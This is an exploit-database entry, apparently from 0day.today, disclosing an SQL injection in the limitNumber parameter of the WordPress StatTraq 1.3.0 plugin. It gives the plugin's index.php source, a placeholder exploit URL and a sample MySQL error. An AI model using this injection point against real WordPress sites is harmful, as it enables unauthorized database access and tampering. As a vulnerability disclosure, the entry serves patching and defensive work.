@@ -1,0 +1,147 @@
+id: 34159
+date: 03/28/2020
+title: WordPress StatTraq 1.3.0 SQL Injection Vulnerability
+author: KingSkrupellos
+cves: 
+
+# Exploit Title : WordPress StatTraq 1.3.0 SQL Injection
+# Author [ Discovered By ] : KingSkrupellos
+# Team : Cyberizm Digital Security Army
+# Software Download Link : downloads.wordpress.org/plugin/wp-stattraq.zip
+# Software Version : 1.3.0
+# WordPress Version : 2.6 or higher - 2.8.3 
+# Tested On : Windows and Linux
+# Category : WebApps
+# Exploit Risk : Medium
+# Google Dorks : 
+StatTraq 1.1 Maintained by Murph.
+StatTraq 1.0a Created by Randy Peterman.
+# Vulnerability Type : CWE-89 [ Improper Neutralization of 
+Special Elements used in an SQL Command ('SQL Injection') ]
+# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
+# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
+# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos
+
+###################################################################
+
+# Information About Software :
+*****************************
+This plugin will allow you to keep track of every hit on your public WordPress site (note that it does not track admin activity).
+
+The following views are available:
+
+Summary View – an overview of blog activity
+Hit Counter – a drill-down report of hits for various periods of time
+User Counter – Track the number of individual computers who came to the site
+Page Views – track the number of total views your WordPress installation served
+Browser – Find out what browsers visited your site
+Referrer – What other sites brought traffic to your own site
+Search Terms – What search terms did search engined link to your site
+SE Saturation – what percent of pages on your site have been crawled by the GoogleBot or the BingBot
+IP addresses – What individual IP addresses requested data from your site
+
+###################################################################
+
+# Impact :
+***********
+WordPress Randy Peterman Murph StatTraq 1.1 is prone to an SQL-injection vulnerability 
+because it fails to sufficiently sanitize user-supplied data before using it in an SQL query. 
+Exploiting this issue could allow an attacker to compromise the application, access or 
+modify data, or exploit latent vulnerabilities in the underlying database. 
+A remote attacker can send a specially crafted request to the vulnerable application and 
+execute arbitrary SQL commands in application`s database. Further exploitation of this 
+vulnerability may result in unauthorized data manipulation. 
+An attacker can exploit this issue using a browser or with any SQL Injector Tool.
+
+###################################################################
+
+# SQL Vulnerable File :
+**********************
+/wp-stattraq/index.php
+
+<?php
+/************************************************************
+Version   Change
+  1.1     Changed the footer information from Randy Peterman
+          to me as the author.
+          Fixed the code so that you can view it without logging in.
+  1.1.1   Patch fix for disable login feature.
+  1.2.6   This one works with wordpress 2.6, now it integrates with 
+    normal wordpress administration. Changed the footer
+    information from Murph to me as the author.
+
+************************************************************/
+// Import own css file
+add_action('admin_head', 'stattraq_admin_css');
+timer_start();
+$options = st_loadOptions();
+
+$year = (int)st_getVar('year',date("Y"));
+$month = (int)st_getVar('month',date("m"));
+$day = (int)st_getVar('day',date("d"));
+$hour = (int)st_getVar('hour',date("H"));
+$minute = (int)st_getVar('day',date("i"));
+$view = st_getVar('view', $options['default_view']);
+$time_frame = st_getVar('time_frame', $options['default_time_frame']); // day
+$orderBy = st_getVar('orderBy', "dd");
+$session_id = st_getVar('session_id', 'google');
+$limitPage = st_getVar('limitPage',0); // the page number for the SQL query limit
+$limitNumber = st_getVar('limitNumber', $options['default_limit_number']); // the number of results to be returned in the query
+$showReferrerType = st_getVar('showReferrerType', 0);
+
+$wpst_url = get_bloginfo('wpurl') . "/wp-admin/admin.php?page=wp-stattraq/index.php&";
+$wpst_ip_url = get_bloginfo('wpurl') . "/wp-content/plugins/wp-stattraq/access_detail.php?";
+$wpst_chart_url = get_bloginfo('wpurl') . "/wp-content/plugins/wp-stattraq/reporter/chart_maker.php?";
+
+// TODO: Check to see if file exists
+$views = array('hit_counter', 'ip_address', 'page_views', 'query_strings', 'search_engine_stats', 'referrer', 'session', 'sessions', 'summary', 'user_agent', 'user_counter', 'options');
+if(in_array($view, $views))
+{
+  require_once(dirname(__FILE__)."/reporter/{$view}.php");
+}
+else
+{
+  echo "You hacker you.";
+  exit();
+}
+?>
+<div style="clear:right;">
+<?php 
+require_once('navigation.php');
+?>
+<div id="stcontent">
+<?php
+getPageContent();
+?>
+</div>
+<div id="stfooter">
+Fresh as of: <?php echo date("Y-m-d H:i:s")?><br />
+Generated in: <?php timer_stop(1);?> seconds
+<br />
+StatTraq <?php echo $stattraq_version;?> Maintained by <a href="http://www.randypeterman.com">Randy Peterman</a>.
+</div>
+</div>
+
+# SQL Vulnerable Parameter :
+***************************
+?view=page_views&time_frame=[ID-NUMBER]&year=[YEAR-NUMBER]&month=[MONTH-NUMBER]&day=[DAY-NUMBER]&hour=[HOUR-NUMBER]&minute=[MINUTE-NUMBER]&limitNumber=[SQL Injection]
+
+# SQL Injection Exploit :
+**********************
+/wp-stattraq/index.php?view=page_views&time_frame=[ID-NUMBER]&year=[YEAR-NUMBER]&month=[MONTH-NUMBER]&day=[DAY-NUMBER]&hour=[HOUR-NUMBER]&minute=[MINUTE-NUMBER]&limitNumber=[SQL Injection]
+
+###################################################################
+
+# Example SQL Database Error :
+****************************
+Erreur de la base de données de WordPress : [You have an error in your SQL syntax; check the 
+manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1]
+SELECT article_id, COUNT( line_id ) AS cnt, DATE_FORMAT(access_time,'%Y') AS year, 
+DATE_FORMAT(access_time,'%m') AS month, DATE_FORMAT(access_time,'%d') AS day, 
+DATE_FORMAT(access_time,'%H') AS hour, DATE_FORMAT(access_time,'%i') AS minute, 
+DATE_FORMAT(access_time,'%Y-%m-%d %H:00') AS dd FROM wp_stattraq WHERE
+ access_time BETWEEN '20050621000000' AND '20050621235959' AND user_agent_type=0 
+GROUP BY article_id ORDER BY cnt DESC LIMIT 0, 1\'
+
+
+#  0day.today [2023-03-24]  #
